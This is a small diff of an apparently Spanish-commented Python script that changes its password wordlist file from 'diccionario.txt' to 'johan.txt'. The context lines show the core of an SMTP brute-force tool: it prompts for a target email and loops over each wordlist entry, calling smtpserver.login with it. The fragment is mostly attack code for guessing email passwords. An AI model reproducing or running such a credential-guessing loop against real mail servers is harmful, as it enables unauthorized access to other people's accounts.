@@ -6,7 +6,7 @@ print("\n")
 email = input("Email: ")
 #Crear Directorio o Diccionario
 #Especificar Ruta dentro de Carpeta
-dic = open("./diccionario.txt", "r")
+dic = open("./johan.txt", "r")
 for pwd in dic:
    try:
     smtpserver.login(email, pwd)
